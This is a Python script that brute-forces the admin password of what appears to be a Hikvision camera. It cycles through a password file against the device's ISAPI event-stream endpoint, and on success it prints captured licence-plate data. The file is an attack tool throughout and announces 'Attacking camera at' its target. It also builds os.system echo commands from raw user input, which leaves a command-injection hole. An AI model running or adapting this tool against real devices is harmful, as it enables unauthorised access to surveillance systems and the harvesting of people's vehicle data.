import concurrent.futures
import logging, ssl, urllib3, contextlib, warnings, requests, json, os, platform

passloc_file = 'passloc.txt'
address_file = 'addressfile.txt'

sys = platform.system()

if sys == "Windows":
    def replace_ip_func(entry):
        os.system('echo ' + entry + ' > addressfile.txt')
    def replace_file_func(file_location):
        os.system('echo ' + file_location + ' > passloc.txt')
    def clear():
        os.system("cls")
elif sys == "Linux" or sys == "Darwin":
    def replace_ip_func(entry):
        os.system('echo "' + entry + '" > addressfile.txt')
    def replace_file_func(file_location):
        os.system('echo "' + file_location + '" > passloc.txt')
    def clear():
        os.system("clear")
else:
    print("Your system isn't recognized. You may want to run it again.\n Quitting!")
    exit()

if os.path.exists(address_file):
    addresfil = "Exists"
else:
    addresfil = ""

if os.path.exists(passloc_file):
    passlo = "Exists"
else:
    passlo = ""
clear()
if not addresfil:
    print("Previous Ip Address not detected")
    print("Enter the Ip Address(e.g. *.*.*.*):")
    entry = input()
    replace_ip_func(entry)
    ans2 = ""
else:
    ans2 = input("Previous Ip Address?(default is yes)")
if not ans2:
    entry = open('addressfile.txt', 'r').read().rstrip('\n')
else:
    print("New ip?: ")
    entry = input()
    replace_ip_func(entry)
clear()
if not passlo:
    print("Previous password file not detected.")
    print("Enter the password file location(e.g. /x/y/z).")
    file_location = input()
    if os.path.exists(file_location):
        replace_file_func(file_location)
    else:
        print("Doesn't exist. Quitting")
    ans1 = ""
else:
    ans1 = input("Previous password file?(leave blank if yes)")
if not ans1:
    file_location = open('passloc.txt', 'r').read().rstrip('\n')
else:
    print("New password location?: ")
    file_location = input()
    replace_file_func(file_location)

urllib3.disable_warnings()

connections = int(100)
clear()
def hikconnect(password):
    entry
    request_url = 'https://' + entry + '/ISAPI/Event/notification/alertStrea'

    auth = requests.auth.HTTPDigestAuth('admin', password)

    with concurrent.futures.ThreadPoolExecutor(max_workers=connections) as executor:
        response = requests.get(request_url, auth=auth, stream=True, verify=False)

    if response.status_code == 200:
        buffer = b''
        for chunk in response.iter_content(chunk_size=1024):
            buffer += chunk

            try:
                decoded_data = buffer.decode("utf-8")
                json_data, separator, remaining_data = decoded_data.partition('\n')

                while separator:
                    if json_data:
                        try:
                            data = json.loads(json_data)
                            if isinstance(data, dict) and "VehicleMatchResult" in data and isinstance(
                                    data["VehicleMatchResult"], dict):
                                plate_info = data["VehicleMatchResult"].get("PlateInfo", {})
                                if isinstance(plate_info, dict) and "plate" in plate_info:
                                    plate_data = plate_info["plate"]
                                    print("Plate:", plate_data)
                        except json.JSONDecodeError:
                            pass

                    json_data, separator, remaining_data = remaining_data.partition('\n')
            except UnicodeDecodeError:
                pass
            buffer = remaining_data.encode("utf-8")
    elif response.status_code == 401:
        problem = "(Wrong login details)"
    elif response.status_code == 403:
        problem = "(Forbidden: HTTPS unavailable)"
    elif response.status_code == 404:
        problem = "(Page not found: possibly wrong IP)"
    else:
        problem = "(Unknown)"
    print("Failed, response:", response.status_code, problem)

def passdetector():
    with open(file_location, 'r') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        password = line.strip()
        print(f"Trying password {i + 1}")
        hikconnect(password)

print("Attacking camera at " + entry)
print("Using password file at " + file_location)
clear()
ans3 = input("Are you sure you want to continue? (Leave blank if yes)")
clear()
if not ans3:
    passdetector()
else:
    print("Quitting")
